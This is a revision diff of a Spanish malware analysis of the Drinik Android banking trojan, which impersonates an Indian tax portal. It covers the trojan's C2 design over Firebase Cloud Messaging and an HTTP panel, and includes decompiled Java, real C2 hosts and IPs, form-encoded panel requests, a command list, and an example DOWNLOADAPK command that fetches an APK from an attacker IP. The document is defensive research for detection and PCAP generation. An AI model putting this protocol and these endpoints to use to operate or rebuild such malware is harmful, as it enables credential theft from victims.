@@ -4,17 +4,19 @@
 
 ### S1054 -- Drinik
 
-Drinik, identificado por MITRE ATT&CK como [S1054](https://attack.mitre.org/software/S1054/), utiliza dos canales complementarios para el mando y control. La evolución y las capacidades de la familia fueron documentadas por Cyble en un [análisis conservado por Web Archive](https://web.archive.org/web/20221114031945/https%3A//blog.cyble.com/2022/10/27/drinik-malware-returns-with-advanced-capabilities-targeting-indian-taxpayers/). Las órdenes pueden llegar mediante Firebase Cloud Messaging (FCM), mientras que el registro de la víctima, el envío del token y los resultados funcionales se transmiten mediante peticiones HTTP a un panel propio. La URL de este panel se obtiene de la preferencia `API`; si no existe un valor almacenado, la muestra utiliza [`http://gia.3utilities.com/iaserver.php`]{.content-visible unless-format="pdf"}[`\nolinkurl{http://gia.3utilities.com/iaserver.php}`{=latex}]{.content-visible when-format="pdf"}.
+Drinik, identificado por MITRE ATT&CK como [S1054](https://attack.mitre.org/software/S1054/), es un troyano bancario diseñado para robar credenciales a la población india mediante la suplantación de un servicio de pago de impuestos. Lo que podían ver las víctimas era, a todos los efectos, un servicio legítimo:
 
-Para la captura se selecciona un flujo que permite observar [T1481.003, Web Service: One-Way Communication](https://attack.mitre.org/techniques/T1481/003/). FCM transporta la orden hacia el terminal, pero la respuesta funcional no regresa por ese servicio: la muestra la envía al panel mediante HTTP. La confirmación técnica que Firebase devuelve al emisor del mensaje no cambia esta interpretación, porque no constituye una respuesta de la aplicación comprometida.
+![Evolución de las interfaces de Drinik utilizadas para suplantar el portal indio del impuesto sobre la renta.](<images/drinik.png>){#fig-drinik-suplantacion fig-alt="Comparación de tres interfaces de Drinik observadas en septiembre de 2021, febrero de 2022 y agosto de 2022."}
 
-El mismo flujo permite representar [T1407, Download New Code at Runtime](https://attack.mitre.org/techniques/T1407/). La orden `DOWNLOADAPK` contiene una URL elegida por el operador; `Oce` la entrega a `DownloadManager`, que guarda la respuesta como `Downloads/AApk.apk`. La muestra también dispone de una orden independiente, `INSTALLAPK`, que prepara ese fichero mediante `PackageInstaller` cuando Android permite instalar paquetes desde esta fuente. La descarga y la instalación no son, por tanto, una única operación automática.
+El malware utiliza dos canales complementarios para el mando y control. La evolución y las capacidades de la familia fueron documentadas por Cyble en un [análisis conservado por Web Archive](https://web.archive.org/web/20221114031945/https%3A//blog.cyble.com/2022/10/27/drinik-malware-returns-with-advanced-capabilities-targeting-indian-taxpayers/). Las órdenes pueden llegar mediante Firebase Cloud Messaging (FCM), mientras que el registro de la víctima, el envío del token y los resultados funcionales se transmiten mediante peticiones HTTP a un panel propio. Esto es precisamente la técnica [T1481.003, Web Service: One-Way Communication](https://attack.mitre.org/techniques/T1481/003/). FCM transporta la orden hacia el terminal, pero la respuesta funcional no regresa por ese servicio: la muestra la envía al panel mediante HTTP.
 
-El análisis se apoya en la APK abierta en JADX. El proyecto coincide con ella por el paquete `lincoln.auy.iAssist`, la etiqueta `iAssist`, la actividad principal `Ibn`, el servicio de accesibilidad `Oce` y el servicio FCM `ehy`.
+También permite representar [T1407, Download New Code at Runtime](https://attack.mitre.org/techniques/T1407/). El operador puede ordenar la descarga de una aplicación desde una dirección determinada y, por separado, solicitar su instalación si el dispositivo lo permite. Por tanto, la descarga no implica que la aplicación se instale automáticamente, como suele ser el caso si recordamos otros malwares analizados.
+
+El análisis se apoya en la APK abierta en JADX:
 
 | Artefacto estudiado       | Función                      | SHA-256                                                            |
 | ------------------------- | ---------------------------- | ------------------------------------------------------------------ |
-| APK `lincoln.auy.iAssist` | Aplicación analizada en JADX | [`86acaac2a95d0b7ebf60e56bca3ce400ef2f9080dbc463d6b408314c265cb523`]{.content-visible unless-format="pdf"}[`\nolinkurl{86acaac2a95d0b7ebf60e56bca3ce400ef2f9080dbc463d6b408314c265cb523}`{=latex}]{.content-visible when-format="pdf"} |
+| APK `lincoln.auy.iAssist` | Aplicación analizada en JADX | `86acaac2a95d0b7ebf60e56bca3ce400ef2f9080dbc463d6b408314c265cb523` |
 
 Los fragmentos siguientes proceden del código descompilado. Se han sustituido únicamente las cadenas resueltas y algunos nombres locales para mejorar su lectura; las condiciones, constantes y llamadas que determinan el tráfico se conservan.
 
@@ -22,21 +24,17 @@ Los fragmentos siguientes proceden del código descompilado. Se han sustituido �
 
 La muestra interviene en cinco conversaciones lógicas. Algunas pertenecen al terminal y otras al lado del operador, distinción necesaria para no atribuir a la APK peticiones que solo existen en la infraestructura de FCM.
 
-| Canal | Extremo y procedencia | Función |
-|---|---|---|
-| Firebase Installations | `firebaseinstallations.googleapis.com:443`, fijado por la biblioteca incluida | Obtención o renovación de la identidad de instalación y de su token de autenticación mediante HTTPS. |
-| Registro y entrega FCM | Infraestructura de Google gestionada por Google Play Services | Obtención del token FCM y entrega cifrada de mensajes `data` a `FirebaseMessagingService`. |
-| Publicación FCM | `fcm.googleapis.com:443`, utilizado por el panel o por el emulador | Envío, desde el lado del operador, de un mensaje dirigido al token de la víctima. La APK no construye esta petición. |
-| Panel HTTP | URL almacenada en `API`; por defecto `gia.3utilities.com:80/iaserver.php` | Registro, estado, resultados, consultas auxiliares y subida de datos mediante formularios HTTP. |
-| Descarga | URL incluida en `DOWNLOADAPK` | Recuperación de `AApk.apk` mediante `DownloadManager`. El esquema, el host y el puerto proceden de la orden. |
-
-Los nombres anteriores requieren resolución DNS cuando se utilizan como dominios. El panel HTTP es el único extremo de la muestra cuyo valor predeterminado aparece en la configuración de `Oce`; el servidor de descarga queda bajo control del emisor del comando. En el laboratorio se selecciona [`http://192.3.124.14/AApk.apk`]{.content-visible unless-format="pdf"}[`\nolinkurl{http://192.3.124.14/AApk.apk}`{=latex}]{.content-visible when-format="pdf"}. La dirección fue observada por Cyble como origen de una APK en una [campaña posterior de Drinik](https://cyble.com/blog/indian-taxpayers-face-a-multifaceted-threat-with-drinik-malwares-return/); la ruta `/AApk.apk` se conserva para reflejar el nombre local fijado por la muestra analizada.
-
-La separación entre FCM y el panel HTTP define T1481.003. El servicio legítimo lleva la orden hasta `ehy`, mientras que `Oce` envía el resultado a `iaserver.php`. Una orden recuperada mediante el sondeo HTTP alternativo `getClientCMD` no demostraría esta subtécnica por sí sola, porque en ese caso la entrada y el retorno utilizarían el mismo canal propio.
+| Canal                  | Extremo y procedencia                                                         | Función                                                                                                              |
+| ---------------------- | ----------------------------------------------------------------------------- | -------------------------------------------------------------------------------------------------------------------- |
+| Firebase Installations | `firebaseinstallations.googleapis.com:443`, fijado por la biblioteca incluida | Obtención o renovación de la identidad de instalación y de su token de autenticación mediante HTTPS.                 |
+| Registro y entrega FCM | Infraestructura de Google gestionada por Google Play Services                 | Obtención del token FCM y entrega cifrada de mensajes `data` a `FirebaseMessagingService`.                           |
+| Publicación FCM        | `fcm.googleapis.com:443`, utilizado por el panel                              | Envío, desde el lado del operador, de un mensaje dirigido al token de la víctima. La APK no construye esta petición. |
+| Panel HTTP             | URL almacenada en `API`; por defecto `gia.3utilities.com:80/iaserver.php`     | Registro, estado, resultados, consultas auxiliares y subida de datos mediante formularios HTTP.                      |
+| Descarga               | URL incluida en `DOWNLOADAPK`                                                 | Recuperación de `AApk.apk` mediante `DownloadManager`. El esquema, el host y el puerto proceden de la orden.         |
 
 #### Tratamiento de cadenas ofuscadas
 
-La clase `Mbo` oculta la mayoría de los literales mediante `bhx()`. El método divide la cadena por el separador ` 5-`, convierte cada elemento a entero y suma siete antes de interpretarlo como carácter:
+La clase `Mbo` oculta la mayoría de los literales mediante la operación `bhx()`. El método divide la cadena por el separador ` 5-`, convierte cada elemento a entero y suma siete antes de interpretarlo como carácter:
 
 ```java
 static String bhx(int guard, String encoded) {
@@ -54,11 +52,11 @@ static String bhx(int guard, String encoded) {
 }
 ```
 
-El primer argumento solo actúa como una comprobación de longitud; no participa en la transformación de cada carácter. Este mecanismo permite recuperar, entre otros valores, `CMD`, `processCMD`, `processCMDdirect`, `API`, `Token`, `insertServerCMD`, `DOWNLOADAPK`, `INSTALLAPK`, [`http://gia.3utilities.com/iaserver.php`]{.content-visible unless-format="pdf"}[`\nolinkurl{http://gia.3utilities.com/iaserver.php}`{=latex}]{.content-visible when-format="pdf"} y `AApk.apk`. No se trata de cifrado aplicado al tráfico, sino de una ofuscación local de cadenas.
+El primer argumento solo actúa como una comprobación de longitud; no participa en la transformación de cada carácter. Este mecanismo permite recuperar (entre otros valores) `CMD`, `processCMD`, `processCMDdirect`, `API`, `Token`, `insertServerCMD`, `DOWNLOADAPK`, `INSTALLAPK`, `http://gia.3utilities.com/iaserver.php` y `AApk.apk`. En resumen, los literales se obtienen a partir de este método.
 
 #### Estructura general del canal HTTP
 
-El servicio de accesibilidad `lincoln.auy.iAssist.Oce` concentra el despacho de órdenes y las comunicaciones con el panel. Durante `onCreate()` crea varias colas de Volley y carga la URL desde las preferencias. Tras resolver las cadenas ofuscadas, las instrucciones relevantes son:
+El servicio de accesibilidad `lincoln.auy.iAssist.Oce` concentra el despachador de órdenes y las comunicaciones con el panel. Durante `onCreate()` crea varias colas de solicitudes de red y carga la URL desde las preferencias. Tras resolver las cadenas ofuscadas, las instrucciones relevantes son:
 
 ```java
 this.bns = Volley.newRequestQueue(this);
@@ -71,7 +69,7 @@ adu = this.fp.getString(
 );
 ```
 
-La variable estática `adu` conserva la URL utilizada por `lp()`. El valor predeterminado emplea HTTP claro sobre TCP/80, aunque una preferencia `API` escrita previamente puede sustituir la URL completa. El método `lp()` crea una petición Volley de tipo `POST`; la subclase devuelve sin modificaciones el mapa recibido como parámetros:
+La variable estática `adu` conserva la URL utilizada por `lp()`. El valor predeterminado emplea HTTP claro sobre TCP/80. El método `lp()` crea una petición de tipo `POST`; la subclase devuelve sin modificaciones el mapa recibido como parámetros:
 
 ```java
 private StringRequest lp(
@@ -102,7 +100,7 @@ private StringRequest lp(
 }
 ```
 
-La función `ne()` incorpora después la petición a la cola indicada. Volley codifica los elementos de `getParams()` como un formulario, por lo que una operación genérica presenta esta forma semántica:
+La función `ne()` incorpora después la petición a la cola indicada. La muestra hace uso de Volley, una biblioteca que permite mandar peticiones HTTP. Volley codifica los elementos de `getParams()` como un formulario, por lo que una operación genérica presenta esta forma semántica:
 
 ```http
 POST /iaserver.php HTTP/1.1
@@ -110,16 +108,6 @@ Host: gia.3utilities.com
 Content-Type: application/x-www-form-urlencoded
 
 CMD=<operacion>&Uid=<uid>&<campo_adicional>=<valor>
-```
-
-El campo `CMD` selecciona la operación del panel y `Uid` identifica a la víctima. Los demás parámetros dependen de la llamada. El registro del token FCM utiliza `Token`:
-
-```http
-POST /iaserver.php HTTP/1.1
-Host: gia.3utilities.com
-Content-Type: application/x-www-form-urlencoded
-
-CMD=Token&Uid=<uid>&Token=<token_fcm>
 ```
 
 Los resultados y mensajes de estado emplean `insertServerCMD` y el campo `ServerCMD`. El despachador construye confirmaciones con el comando recibido, un resultado y el terminador `##-##`; otras rutinas, como `cao()`, envían mensajes directos con una marca temporal:
@@ -141,18 +129,18 @@ Además de estas dos operaciones, el código prepara otros formularios para el m
 | `ScreenState` | Comunica el estado de la pantalla. |
 | `UpdateAccStat` | Actualiza el estado del servicio de accesibilidad. |
 | `R4VSent` | Informa del avance del flujo de verificación móvil. |
-| [`readdeviceVerificationStatus`]{.content-visible unless-format="pdf"}[`\nolinkurl{readdeviceVerificationStatus}`{=latex}]{.content-visible when-format="pdf"} | Consulta el estado de verificación y procesa una respuesta separada por `:::`; esta respuesta puede proporcionar la URL de la primera descarga. |
+| `readdeviceVerificationStatus` | Consulta el estado de verificación y procesa una respuesta separada por `:::`; esta respuesta puede proporcionar la URL de la primera descarga. |
 | `Sms` | Envía datos de SMS acumulados junto con los campos auxiliares previstos por la muestra. |
 | `FileUpload` | Transfiere un fichero codificado mediante `encodedFile`, `fileName` y, de forma opcional, `Bucket`. |
 | `INSPECTION` | Envía información de inspección de interfaz. |
 | `getClientCMD` | Recupera órdenes mediante sondeo HTTP como alternativa a FCM. |
 | `getLogingStat` | Consulta el estado de inicio de sesión mantenido por el panel. |
 
-Las respuestas no comparten un formato único. `dww()` interpreta JSON para algunas operaciones, cadenas delimitadas por `:::` para otras y respuestas textuales de éxito en casos concretos. Por ello, el nombre de operación que `lp()` entrega al callback es necesario para seleccionar el analizador correspondiente.
+Las respuestas no comparten un formato único. Por ejemplo, `dww()` interpreta JSON para algunas operaciones, cadenas delimitadas por `:::` para otras y respuestas textuales de éxito en casos concretos. La realidad es que este canal contiene mucha variabilidad y no es sencillo de generalizar. 
 
 #### Estructura general del canal FCM
 
-La APK no publica mensajes en FCM. Esa acción corresponde al lado del operador, que ya debe conocer el token comunicado por la víctima. En el laboratorio, el panel emulado representa la publicación mediante una petición HTTPS a la API HTTP v1 de FCM:
+La APK no publica mensajes en FCM. Esa acción corresponde al lado del operador, que ya debe conocer el token comunicado por la víctima. Un ejemplo de mensaje que el panel debe mandar es el siguiente.
 
 ```http
 POST /v1/projects/<project_id>/messages:send HTTP/1.1
@@ -169,9 +157,7 @@ Content-Type: application/json
 }
 ```
 
-Esta petición describe el mensaje lógico que construye el emisor; no es tráfico generado por Drinik. Firebase entrega después el mensaje al terminal por un canal TLS gestionado por Google Play Services. Sin descifrado, la captura de ese canal muestra los extremos, el transporte y el intercambio TLS, pero no el valor de `data.CMD`.
-
-El callback de la aplicación recibe un mapa `data` equivalente a:
+Firebase entrega después el mensaje al terminal por un canal TLS gestionado por Google Play Services. El callback de la aplicación recibe un mapa equivalente a:
 
 ```json
 {
@@ -187,13 +173,11 @@ El despachador utiliza `:::` para separar el nombre y los argumentos:
 <nombre_comando>:::<arg1>:::<arg2>
 ```
 
-También acepta colas con varios comandos y retardos:
+También acepta colas con varios comandos y retardos. El separador `##-##` divide órdenes y `####` asocia un retardo a la orden precedente. Antes de procesar la cola, el código restaura tres secuencias escapadas: `#D#` representa `:::`, `#A#` representa `####` y `#B#` representa `##-##`. Un ejemplo genérico de la estructura comentada es:
 
 ```text
 CMD1:::arg1####1000##-##CMD2:::arg1:::arg2
 ```
-
-El separador `##-##` divide órdenes y `####` asocia un retardo a la orden precedente. Antes de procesar la cola, el código restaura tres secuencias escapadas: `#D#` representa `:::`, `#A#` representa `####` y `#B#` representa `##-##`.
 
 Entre las órdenes reconocidas se encuentran las siguientes:
 
@@ -209,18 +193,16 @@ Entre las órdenes reconocidas se encuentran las siguientes:
 | `ABORTSEQUENCE` | Interrumpe la secuencia de acciones en curso. |
 | `KILLSOUND` | Ejecuta la rutina destinada a silenciar el dispositivo. |
 | `DEFOREGROUNDIFY` | Modifica el estado de primer plano del servicio. |
-| [`UNBLOCK_NON_CONTACT_CALLS`]{.content-visible unless-format="pdf"}[`\nolinkurl{UNBLOCK_NON_CONTACT_CALLS}`{=latex}]{.content-visible when-format="pdf"} | Desactiva el bloqueo de llamadas de números ajenos a los contactos. |
+| `UNBLOCK_NON_CONTACT_CALLS` | Desactiva el bloqueo de llamadas de números ajenos a los contactos. |
 | `FORWARDSMS` y `812` | Preparan el reenvío de SMS; `812` se transforma en `FORWARDSMS`. |
 | `BLOCKSMS`, `UNBLOCKSMS` y `400` | Cambian el estado de bloqueo de SMS; `400` actúa como alias de desbloqueo. |
 | `DELETE_FILE:::<ruta>` | Intenta borrar el fichero indicado y comunica el resultado. |
 | `IDLESTATE` | Comprueba el estado interactivo del dispositivo. |
 | `Ping` | Activa la rutina local de baliza. |
 
-La tabla resume capacidades del despachador, no una secuencia que deba ejecutarse completa. El flujo seleccionado utiliza `DOWNLOADAPK`; `INSTALLAPK` se analiza por separado para delimitar el efecto local posterior.
-
 #### Registro y mantenimiento del token FCM
 
-El panel necesita conocer un token FCM antes de poder dirigir un mensaje a la víctima. En una instalación sin identidad válida almacenada, la biblioteca Firebase Installations incluida en la APK crea primero una instalación mediante [`FirebaseInstallationServiceClient`]{.content-visible unless-format="pdf"}[`\nolinkurl{FirebaseInstallationServiceClient}`{=latex}]{.content-visible when-format="pdf"}. El cliente fija HTTPS, el dominio de Firebase y la ruta del proyecto. La representación lógica del cuerpo se muestra sin la compresión GZIP que aplica la biblioteca:
+Tras las explicaciones de alto nivel sobre los dos canales principales, conviene ya empezar el estudio secuencial de qué ocurre a nivel de red. Primero, el panel necesita conocer un token FCM antes de poder dirigir un mensaje a la víctima. En una instalación sin identidad válida almacenada, la biblioteca Firebase Installations incluida en la APK crea primero una instalación mediante `FirebaseInstallationServiceClient`. El cliente fija HTTPS, el dominio de Firebase y la ruta del proyecto. La representación lógica del cuerpo se muestra sin la compresión GZIP que aplica la biblioteca:
 
 ```http
 POST /v1/projects/<project_id>/installations HTTP/1.1
@@ -257,23 +239,7 @@ Content-Type: application/json
 }
 ```
 
-Cuando el token de autenticación ha caducado, la misma clase utiliza el `refreshToken` en una operación independiente:
-
-```http
-POST /v1/projects/<project_id>/installations/<firebase_installation_id>/authTokens:generate HTTP/1.1
-Host: firebaseinstallations.googleapis.com
-Content-Type: application/json
-Authorization: FIS_v2 <fis_refresh_token>
-x-goog-api-key: <firebase_api_key>
-
-{
-  "installation": {
-    "sdkVersion": "a:17.0.1"
-  }
-}
-```
-
-La creación de la instalación y la renovación no tienen que repetirse en cada arranque: Firebase reutiliza el estado válido almacenado. Una vez disponible la identidad FIS, `GmsRpc.getToken()` prepara el registro FCM y delega el transporte en Google Play Services. El objeto lógico contiene estos valores:
+Esto permite obtener una "identidad de instalación de Firebase", lo cual no es el token aún. Digamos que es el paso previo a obtener un token en el ecosistema FCM. Una vez disponible la identidad, `GmsRpc.getToken()` prepara el registro FCM y delega el transporte en Google Play Services. El objeto lógico local contiene estos valores:
 
 ```text
 scope=*
@@ -292,9 +258,9 @@ Firebase-Client-Log-Type=<valor_opcional>
 Firebase-Client=<valor_opcional>
 ```
 
-Este `Bundle` expresa los parámetros entregados a Google Play Services; el código de la APK no permite convertirlo en una petición HTTP propia de Drinik. La respuesta lógica contiene [`registration_id=<token_fcm>`]{.content-visible unless-format="pdf"}[`\nolinkurl{registration_id=<token_fcm>}`{=latex}]{.content-visible when-format="pdf"}, que termina llegando al callback `ehy.onNewToken()`.
+Este `Bundle` expresa los parámetros entregados a Google Play Services, este proceso local se encarga por su cuenta de generar la petición de registro de token sobre la infraestructura de Google, por lo que aquí la muestra no permite sacar más información al respecto. Eso sí, la respuesta lógica contiene `registration_id=<token_fcm>`, que termina llegando al callback `ehy.onNewToken()`.
 
-La clase `ehy`, que hereda de [`FirebaseMessagingService`]{.content-visible unless-format="pdf"}[`\nolinkurl{FirebaseMessagingService}`{=latex}]{.content-visible when-format="pdf"}, guarda el token y marca su envío como pendiente:
+La clase `ehy`, que hereda de `FirebaseMessagingService`, guarda el token y marca su envío como pendiente:
 
 ```java
 public void onNewToken(String token) {
@@ -313,7 +279,7 @@ public void onNewToken(String token) {
 }
 ```
 
-La llamada exacta cambia a [`startForegroundService()`]{.content-visible unless-format="pdf"}[`\nolinkurl{startForegroundService()}`{=latex}]{.content-visible when-format="pdf"} cuando las notificaciones están deshabilitadas. Si `SystemActive` todavía es falso, el token permanece en preferencias; `Oce.onStartCommand()` comprueba después que exista, que `TokenSent` continúe a falso y que haya transcurrido el intervalo de reintento antes de volver a despachar `Token:::<valor>`.
+La llamada exacta cambia a `startForegroundService()` cuando las notificaciones están deshabilitadas. Si `SystemActive` todavía es falso, el token permanece en preferencias; `Oce.onStartCommand()` comprueba después que exista, que `TokenSent` continúe a falso y que haya transcurrido el intervalo de reintento antes de volver a despachar `Token:::<valor>`.
 
 El método `eil()` convierte ese comando interno en el formulario destinado al panel:
 
@@ -332,11 +298,11 @@ private void eil(Context context, String token) {
 }
 ```
 
-La secuencia de habilitación del canal push queda así delimitada: Firebase proporciona la identidad y el token FCM, la aplicación conserva ese token y `Oce` lo comunica al panel mediante el POST HTTP `CMD=Token`. Solo después el lado del operador dispone del identificador necesario para publicar una orden dirigida a esa instalación.
+La secuencia de habilitación del canal push queda así delimitada: Firebase proporciona la identidad y el token FCM, la aplicación conserva ese token y `Oce` lo comunica al panel mediante el POST HTTP `CMD=Token`. Solo después el lado del operador dispone del identificador necesario para publicar una orden dirigida a esa instalación. Conviene aquí tener clara una cuestión, el hecho de que la petición y respuesta de obtención del token no puedan ser reconstruidas no se debe tomar como una limitación. Dicho tráfico va cifrado y en ningún momento va a ser un punto de detección para un sistema NGFW/IDS/IPS, al ser un servicio completamente legítimo. 
 
 #### Recepción de comandos por FCM
 
-La recepción se implementa en `ehy.onMessageReceived()`. El código exige que el mapa `data` contenga `CMD`. Si el valor incluye los separadores de cola, utiliza el extra `processCMDdirect`; para una orden simple utiliza `processCMD`. El servicio se inicia en primer plano cuando las notificaciones están deshabilitadas y por la vía ordinaria en caso contrario. El flujo normalizado es:
+La recepción se implementa en el método `ehy.onMessageReceived()`. El código exige que el mapa `data` contenga `CMD`. Si el valor incluye los separadores de cola, utiliza el extra `processCMDdirect`; para una orden simple utiliza `processCMD`. El código que lo define es:
 
 ```java
 public void onMessageReceived(RemoteMessage message) {
@@ -362,7 +328,7 @@ public void onMessageReceived(RemoteMessage message) {
 }
 ```
 
-Para combinar T1481.003 y T1407 se utiliza una orden simple:
+Para los ámbitos de los que trata el estudio, integrar T1407 es tan sencillo como hacer uso de esta orden:
 
 ```json
 {
@@ -372,7 +338,7 @@ Para combinar T1481.003 y T1407 se utiliza una orden simple:
 }
 ```
 
-El método `Oce.onStartCommand()` entrega `processCMD` a `aes()`. El despachador separa el comando por `:::` y, en la rama `DOWNLOADAPK`, pasa la URL a `btz()`:
+El método `Oce.onStartCommand()` entrega `processCMD` a `aes()` (aunque se llame aes, este método no tiene relación alguna con el algoritmo de cifrado simétrico). El despachador separa el comando por `:::` y, en la rama `DOWNLOADAPK`, pasa la URL a `btz()`:
 
 ```java
 if ("DOWNLOADAPK".equals(commandName)) {
@@ -387,7 +353,7 @@ if ("DOWNLOADAPK".equals(commandName)) {
 }
 ```
 
-El tercer argumento es relevante: la rama almacena [`installAfterDownload=false`]{.content-visible unless-format="pdf"}[`\nolinkurl{installAfterDownload=false}`{=latex}]{.content-visible when-format="pdf"}. Antes de encolar la transferencia, `btz()` despacha dos limpiezas internas, restablece el estado de descarga y registra dinámicamente `Tbk` para `DOWNLOAD_COMPLETE`:
+El tercer argumento determina si el APK debe instalarse al terminar la descarga. En particular, `btz()` guarda `installAfterDownload=false`, por lo que la operación se limita inicialmente a descargar el fichero. Antes de iniciar la transferencia, el método elimina posibles copias anteriores de artefactos de red previamente descargados, reinicia los indicadores que registran el estado de la descarga y registra dinámicamente el receptor `Tbk`. Este receptor queda a la espera de la acción `DOWNLOAD_COMPLETE`, mediante la cual Android notificará a la aplicación que la descarga ha finalizado.
 
 ```java
 private void btz(
@@ -421,9 +387,7 @@ private void btz(
 }
 ```
 
-Las dos órdenes `DELETE_FILE` recorren el mismo despachador y pueden producir mensajes de resultado hacia el panel. Como Volley y `DownloadManager` trabajan de forma asíncrona, sus POST y el comienzo de la descarga pueden intercalarse en la captura; el orden de las llamadas Java no fija por sí solo el orden final de todos los segmentos TCP.
-
-Una vez encolada la transferencia, el propio `aes()` construye el acuse funcional de `DOWNLOADAPK` mediante `insertServerCMD`. Este mensaje confirma que la orden se ha procesado y que la descarga se ha programado; no demuestra que se hayan recibido todos los bytes:
+Una vez encolada la transferencia, el propio `aes()` construye el asentimiento de haber recibido la orden de descarga, mediante `insertServerCMD`. Este mensaje se comunica por el canal HTTP.
 
 ```http
 POST /iaserver.php HTTP/1.1
@@ -433,7 +397,7 @@ Content-Type: application/x-www-form-urlencoded
 CMD=insertServerCMD&Uid=<uid>&ServerCMD=<estado>DOWNLOADAPK:::http://192.3.124.14/AApk.apk has been executed - <resultado>##-##
 ```
 
-La transferencia posterior se dirige al extremo incluido en la orden. Para el valor controlado del laboratorio se espera:
+La transferencia posterior (finalmente la descarga como tal) se dirige al extremo incluido en la orden. Un ejemplo sería:
 
 ```http
 GET /AApk.apk HTTP/1.1
@@ -475,9 +439,7 @@ if ("android.intent.action.DOWNLOAD_COMPLETE".equals(intent.getAction())) {
 }
 ```
 
-La bandera `firstDownloadStarted` no se activa en la rama FCM de `DOWNLOADAPK`. El código la establece cuando la respuesta HTTP a [`readdeviceVerificationStatus`]{.content-visible unless-format="pdf"}[`\nolinkurl{readdeviceVerificationStatus}`{=latex}]{.content-visible when-format="pdf"} aporta el primer `downloadLink`, o cuando `onServiceConnected()` retoma ese enlace almacenado. Por ello, un `DOWNLOADAPK` recibido directamente por FCM garantiza la programación de la descarga y su acuse genérico, pero solo genera `firstDownloadCompleted!` si ese estado previo ya estaba activo.
-
-Cuando la condición se cumple, `SendMessage` llama primero a `cao()` y produce un mensaje directo:
+Posteriormente, `SendMessage` llama primero a `cao()` y produce un mensaje directo:
 
 ```http
 POST /iaserver.php HTTP/1.1
@@ -489,33 +451,12 @@ CMD=insertServerCMD&Uid=<uid>&ServerCMD=D:::<fecha> -- firstDownloadCompleted!##
 
 Después, la orden interna continúa hasta la confirmación genérica del despachador, por lo que puede aparecer otro POST que indique la ejecución de `SendMessage`. La finalización de la descarga puede generar así más de un retorno HTTP, pero ninguno debe confundirse con la transferencia del APK.
 
-La instalación pertenece a otra rama. `INSTALLAPK` comprueba [`PackageManager.canRequestPackageInstalls()`]{.content-visible unless-format="pdf"}[`\nolinkurl{PackageManager.canRequestPackageInstalls()}`{=latex}]{.content-visible when-format="pdf"} y solo entonces invoca `elw()`. Este método crea una sesión, copia `Downloads/AApk.apk` mediante `elz()` y confirma la sesión con un `PendingIntent` dirigido a `Tbk`:
-
-```java
-private void elw() {
-    PackageInstaller installer = getPackageManager().getPackageInstaller();
-    PackageInstaller.Session session = installer.openSession(
-        installer.createSession(new PackageInstaller.SessionParams(
-            PackageInstaller.SessionParams.MODE_FULL_INSTALL
-        ))
-    );
-
-    elz(session);
-
-    Intent status = new Intent(this, Tbk.class);
-    status.setAction("lincoln.auy.iAssist.emd");
-    session.commit(
-        PendingIntent.getBroadcast(this, 11, status, <flags>)
-            .getIntentSender()
-    );
-}
-```
-
-El receptor abre la confirmación de Android cuando el estado es [`STATUS_PENDING_USER_ACTION`]{.content-visible unless-format="pdf"}[`\nolinkurl{STATUS_PENDING_USER_ACTION}`{=latex}]{.content-visible when-format="pdf"}, registra el éxito o el error en preferencias y no genera por sí mismo una conexión nueva. En el PCAP, T1407 queda demostrado por la descarga de los bytes solicitados; la posterior sesión de instalación es un efecto local y requiere una orden y permisos independientes.
+La instalación pertenece a otra rama del código, `INSTALLAPK`. En nuestro caso, T1407 solo implica descarga de código (lo cual ya ha sucedido) y por lo tanto podemos cerrar el análisis en este punto.
 
 #### Secuencia comunicativa
 
-La secuencia representa el flujo de red seleccionado y conserva como condicional el aviso asociado a la primera descarga:
+La secuencia representa un flujo de red fidedigno a lo comentado.
+
 
 ```{=latex}
 \clearpage
@@ -523,8 +464,8 @@ La secuencia representa el flujo de red seleccionado y conserva como condicional
 
 ```{mermaid}
 %%| label: fig-drinik-comunicaciones
-%%| fig-cap: "Secuencia de comunicaciones reproducida para Drinik."
-%%| fig-width: 6.0
+%%| fig-cap: "Alta en Firebase, recepción de órdenes mediante FCM y comunicaciones HTTP de Drinik con el panel y el servidor de descarga."
+%%| fig-width: 6
 sequenceDiagram
     participant V as Terminal Android
     participant N as DNS
@@ -569,14 +510,9 @@ sequenceDiagram
     end
 ```
 
-```{=latex}
-\clearpage
-```
-
-
 #### Laboratorio de generación del PCAP
 
-El laboratorio reproduce el flujo mediante un cliente y varios servicios Python aislados; no ejecuta la APK. El resolutor controlado asigna direcciones diferenciadas a los nombres utilizados por el escenario. El emulador representa Firebase Installations, el registro FCM, la publicación del operador y la entrega del mensaje por un canal TLS similar a `mtalk`. El panel y el servidor de descarga utilizan HTTP claro, de acuerdo con las URL seleccionadas.
+El laboratorio reproduce el flujo mediante un cliente y varios servicios Python aislados; no ejecuta la APK. Esta decisión se ha tomado tras estudiar cómo han evolucionado las diferentes APIs que utiliza el troyano. Esto es necesario puesto que la muestra tiene una dependencia importante con Google Play Services. Este proceso local depende de la versión de API Android, pero también de otros factores. Por lo tanto, usar una máquina virtual en la API requerida por el malware no solventa el problema y habría que analizar la compatibilidad con la versión de  Google Play Services que trae la imagen por defecto. El protocolo de comunicación no es complejo y por lo tanto la emulación completa en Python es completamente viable. La configuración es:
 
 | Entidad | Dirección y servicio | Procedencia |
 |---|---|---|
@@ -586,10 +522,4 @@ El laboratorio reproduce el flujo mediante un cliente y varios servicios Python 
 | Panel de Drinik | `198.12.107.13:80` | IOC asociado con `gia.3utilities.com` y publicado por Cyble en el [análisis de la variante estudiada](https://web.archive.org/web/20221114031945/https%3A//blog.cyble.com/2022/10/27/drinik-malware-returns-with-advanced-capabilities-targeting-indian-taxpayers/). |
 | Servidor de descarga | `192.3.124.14:80` | IOC publicado por Cyble en una [campaña posterior de Drinik](https://cyble.com/blog/indian-taxpayers-face-a-multifaceted-threat-with-drinik-malwares-return/) que descargaba `Child.apk`; el laboratorio lo combina de forma explícita con la ruta `/AApk.apk` requerida por este escenario. |
 
-La API FCM del laboratorio funciona sobre HTTP/1.1 protegido mediante TLS y el canal de entrega usa un protocolo de líneas sintético. Ambos conservan la causalidad y el contenido lógico necesarios para el análisis, pero no reproducen el protocolo interno completo de Google Play Services. El registro `drinik-sslkeys.log`, almacenado junto al PCAP, permite descifrar las conexiones TLS de esta ejecución en Wireshark.
-
